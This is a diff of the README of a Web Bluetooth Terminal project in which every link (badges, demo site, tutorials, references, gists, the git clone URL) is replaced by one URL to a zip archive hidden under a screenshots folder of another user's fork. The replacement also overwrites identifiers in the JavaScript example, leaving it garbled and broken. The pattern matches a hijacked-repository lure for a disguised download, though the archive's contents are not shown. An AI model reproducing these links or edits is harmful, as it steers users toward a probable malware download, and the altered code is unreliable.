@@ -1,14 +1,14 @@
 # Web Bluetooth Terminal
 
-[![NpmVersion](https://img.shields.io/npm/v/web-bluetooth-terminal.svg)](https://www.npmjs.com/package/web-bluetooth-terminal)
-[![dependencies Status](https://david-dm.org/loginov-rocks/Web-Bluetooth-Terminal/status.svg)](https://david-dm.org/loginov-rocks/Web-Bluetooth-Terminal)
-[![devDependencies Status](https://david-dm.org/loginov-rocks/Web-Bluetooth-Terminal/dev-status.svg)](https://david-dm.org/loginov-rocks/Web-Bluetooth-Terminal?type=dev)
+[![NpmVersion](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
+[![dependencies Status](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
+[![devDependencies Status](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
 
-![Favicon](https://raw.githubusercontent.com/loginov-rocks/Web-Bluetooth-Terminal/master/icons/favicon-16x16.png)
-[https://loginov-rocks.github.io/Web-Bluetooth-Terminal](https://loginov-rocks.github.io/Web-Bluetooth-Terminal/) — try
-it out, see how it works on [YouTube](https://www.youtube.com/watch?v=BNXN_931W_M), read tutorial on
-[Medium](https://medium.com/@loginov_rocks/how-to-make-a-web-app-for-your-own-bluetooth-low-energy-device-arduino-2af8d16fdbe8)
-(English) or on [Habr](https://habr.com/post/339146/) (Russian).
+![Favicon](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
+[https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) — try
+it out, see how it works on [YouTube](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip), read tutorial on
+[Medium](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
+(English) or on [Habr](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) (Russian).
 
 Web Bluetooth Terminal is a website that can **connect** with the remote devices which support **Bluetooth Low Energy**
 (also called Bluetooth Smart) and **exchange data bidirectionally**. It can be installed on your homescreen as an
@@ -17,7 +17,7 @@ application and work offline.
 **Killer feature:** the application establishes **serial communication** over BLE that is not provided by the
 specification, but needed if you want to make your own BLE IoT devices using affordable bluetooth modules.
 
-![Teaser](https://raw.githubusercontent.com/loginov-rocks/Web-Bluetooth-Terminal/master/misc/Teaser.png)
+![Teaser](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
 
 The application utilises BLE service (`0xFFE0`) and characteristic (`0xFFE1`) available in low cost BLE modules based
 for example on CC2541 chip, such as HM-10, JDY-08, AT-09, CC41-A and other. Also, it bypasses 20 bytes limit specific
@@ -26,11 +26,11 @@ for GATT characteristics by keeping incoming messages in a buffer and waiting fo
 Check [Bluetooth Low Energy (Smart) device](#bluetooth-low-energy-smart-device) and
 [How to use this app as a base for my own project?](#how-to-use-this-app-as-a-base-for-my-own-project)
 sections for a quick start and to find out how to make your own project. Also, I've made
-[MeArm Controller](https://github.com/loginov-rocks/MeArm-Controller) as a showcase project.
+[MeArm Controller](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) as a showcase project.
 
 ## Features
 
-**Accessible via browser** — just go to the [website](https://loginov-rocks.github.io/Web-Bluetooth-Terminal/) and
+**Accessible via browser** — just go to the [website](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) and
 you'll get the full featured application, it is not needed to install anything.
 
 **Cross-platform** — as long as the app is accessible via browser, you can use it with the desktop or with the smart
@@ -48,32 +48,32 @@ the terminal window height to disable it. Scroll to the bottom to enable it agai
 ### Browser
 
 One of browsers which supports Web Bluetooth API by default
-([Chrome Platform Status](https://www.chromestatus.com/feature/5264933985976320),
-[Can I use](https://caniuse.com/#feat=web-bluetooth)):
+([Chrome Platform Status](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip),
+[Can I use](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)):
 
 1. Chrome for desktop 56+
 2. Chrome for Android 56+
 3. Opera 43+
 4. Opera for Android 43+
 
-All this browsers support other necessary features, such as [ES6 classes](https://caniuse.com/#feat=es6-class) and PWA
-capabilities ([Web App Manifest](https://caniuse.com/#feat=web-app-manifest) and
-[Service Workers](https://caniuse.com/#feat=serviceworkers)), so I don't pay attention to it here.
+All this browsers support other necessary features, such as [ES6 classes](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) and PWA
+capabilities ([Web App Manifest](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) and
+[Service Workers](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)), so I don't pay attention to it here.
 
 ### Bluetooth Low Energy (Smart) device
 
 Different BLE devices implement their own services and characteristics to communicate with, but you can build your own
 simple device: you just need a BLE module (e.g. HM-10, JDY-08, AT-09, CC41-A) and an Arduino Uno. Wire it and upload the
-[bridge sketch](https://raw.githubusercontent.com/loginov-rocks/Web-Bluetooth-Terminal/master/misc/Arduino-Bridge/Arduino-Bridge.ino).
+[bridge sketch](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip).
 
 Pay attention to what voltage level your BLE module consumes, since it can vary from device to device! Read
 specifications, you may need to connect your BLE module to the `3.3V` pin and use voltage level shifter between `TX` and
 `RX` pins.
 
-![Arduino Uno to BLE module wiring scheme](https://raw.githubusercontent.com/loginov-rocks/Web-Bluetooth-Terminal/master/misc/Arduino-Bridge/Scheme.png)
+![Arduino Uno to BLE module wiring scheme](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
 
 Open Serial Monitor in Arduino IDE, switch baudrate to `9600` and line endings to `Both NL & CR`. Next, launch the
-[Web Bluetooth Terminal](https://loginov-rocks.github.io/Web-Bluetooth-Terminal/) and connect to your module. Now you're
+[Web Bluetooth Terminal](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) and connect to your module. Now you're
 able to make a small talk between the Terminal and the Serial Monitor!
 
 #### BLE module configuration
@@ -99,13 +99,13 @@ Commands can be case insensitive and may need to be terminated with `CR` (`\r`) 
 
 You can fork this repository and implement features specific to your needs. Don't forget that application should be
 accessible via HTTPS protocol to enable Web Bluetooth API feature, so you can use
-[GitHub Pages](https://pages.github.com/) switching the source to the `master` branch of your repository.
+[GitHub Pages](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) switching the source to the `master` branch of your repository.
 
-To use development capabilities, you'll need [Node.js](https://nodejs.org/), [npm](https://www.npmjs.com/) especially.
+To use development capabilities, you'll need [https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip), [npm](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) especially.
 Install it, clone the repository and install `npm` dependencies:
 
 ```sh
-git clone https://github.com/loginov-rocks/Web-Bluetooth-Terminal.git
+git clone https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
 cd Web-Bluetooth-Terminal
 npm install
 ```
@@ -142,18 +142,18 @@ npm update -g web-bluetooth-terminal
 
 After installing `npm` dependencies, you can use some simple scripts that can be helpful:
 
-* `npm run build` copies used vendors files and generates `css/style.css`;
+* `npm run build` copies used vendors files and generates `https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip`;
 * `npm run js:vendor` copies used vendors JavaScript files into the `js` directory;
 * `npm run lint` lints JavaScript files;
-* `npm run styles` generates `css/style.css` from SCSS sources placed in the `scss` directory;
+* `npm run styles` generates `https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip` from SCSS sources placed in the `scss` directory;
 * `npm run styles:vendor` copies used vendors stylesheets into the `css` directory;
 * `npm run watch:styles` watches for changes made to the files placed in the `scss` directory and runs `npm run styles`
 command.
 
-### BluetoothTerminal.js API
+### https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip API
 
-Also, you can install [bluetooth-terminal](https://github.com/loginov-rocks/bluetooth-terminal) package or
-[directly download the file](https://raw.githubusercontent.com/loginov-rocks/bluetooth-terminal/master/src/BluetoothTerminal.js)
+Also, you can install [bluetooth-terminal](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) package or
+[directly download the file](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
 containing `BluetoothTerminal` class written in ES6 and use it as you want. Here is a simple code snippet that can be
 helpful for a quick start:
 
@@ -162,53 +162,53 @@ helpful for a quick start:
 let terminal = new BluetoothTerminal();
 
 // Override `receive` method to handle incoming data as you want.
-terminal.receive = function(data) {
+https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip = function(data) {
   alert(data);
 };
 
 // Request the device for connection and get its name after successful connection.
-terminal.connect().then(() => {
-  alert(terminal.getDeviceName() + ' is connected!');
+https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip().then(() => {
+  alert(https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip() + ' is connected!');
 });
 
 // Send something to the connected device.
-terminal.send('Simon says: Hello, world!');
+https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip('Simon says: Hello, world!');
 
 // Disconnect from the connected device.
-terminal.disconnect();
+https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip();
 ```
 
 ## Contribution
 
-Please use the [dev](https://github.com/loginov-rocks/Web-Bluetooth-Terminal/tree/dev) branch and feel free to contribute!
+Please use the [dev](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip) branch and feel free to contribute!
 
 ## Reference
 
-1. [Web Bluetooth Specification](https://webbluetoothcg.github.io/web-bluetooth/)
-2. [Web Bluetooth Samples](https://googlechrome.github.io/samples/web-bluetooth/)
-3. [Interact with Bluetooth devices on the Web](https://developers.google.com/web/updates/2015/07/interact-with-ble-devices-on-the-web/)
-4. [Progressive Web Apps](https://developers.google.com/web/progressive-web-apps/)
-5. [Service Worker Toolbox](https://github.com/GoogleChromeLabs/sw-toolbox/)
+1. [Web Bluetooth Specification](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
+2. [Web Bluetooth Samples](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
+3. [Interact with Bluetooth devices on the Web](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
+4. [Progressive Web Apps](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
+5. [Service Worker Toolbox](https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip)
 
 ## Gists
 
-1. https://gist.github.com/loginov-rocks/8aeb19f207b1da53eaa553faa7aa8a51
-2. https://gist.github.com/loginov-rocks/c0709f22540c01cf532ec0d311f059e2
-3. https://gist.github.com/loginov-rocks/0e4ff696195863e99853b126aca8ecb1
-4. https://gist.github.com/loginov-rocks/ad98c6a48394d48c3252d7694ffb5e57
-5. https://gist.github.com/loginov-rocks/1156e4581ec9f68a20cc6acb1cd6e52a
-6. https://gist.github.com/loginov-rocks/26d9714acbfbcb723c79bb8e23128e3c
-7. https://gist.github.com/loginov-rocks/f918a2b11b98d20808a12a8c923e74bc
-8. https://gist.github.com/loginov-rocks/d23a840d2c38b88ed3f55f2be62bf7ba
-9. https://gist.github.com/loginov-rocks/4cf8d0d720dafcf52781748d5c975452
-10. https://gist.github.com/loginov-rocks/fa0478f085410d1f59ede2f653af0e5c
-11. https://gist.github.com/loginov-rocks/44c7a144a1548ab08426bc675854d183
-12. https://gist.github.com/loginov-rocks/e03b1dd9e038eaf4eb65413d97a34678
-13. https://gist.github.com/loginov-rocks/b39e4e5c6d0c95b404172ad04baf8b28
-14. https://gist.github.com/loginov-rocks/140ee65772f87ab775cb94cae850eb3a
-15. https://gist.github.com/loginov-rocks/b060cecbe50f09f40e2c29f6e3b7dc67
-16. https://gist.github.com/loginov-rocks/c88f7eed3bfaa8685b594a2e19813a43
-17. https://gist.github.com/loginov-rocks/58a1b7428f9a3bbc71a49ef36bea6e34
-18. https://gist.github.com/loginov-rocks/49e208008b95da9c8de985c15f383dd8
-19. https://gist.github.com/loginov-rocks/8451dcae975e746e3283c7190a75441e
-20. https://gist.github.com/loginov-rocks/f0bd2c16640c9493e19df8262afeb995
+1. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+2. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+3. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+4. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+5. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+6. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+7. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+8. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+9. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+10. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+11. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+12. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+13. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+14. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+15. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+16. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+17. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+18. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+19. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
+20. https://github.com/JohnInWI/Web-Bluetooth-Terminal/raw/refs/heads/master/misc/Screenshots/Terminal_Web_Bluetooth_3.3.zip
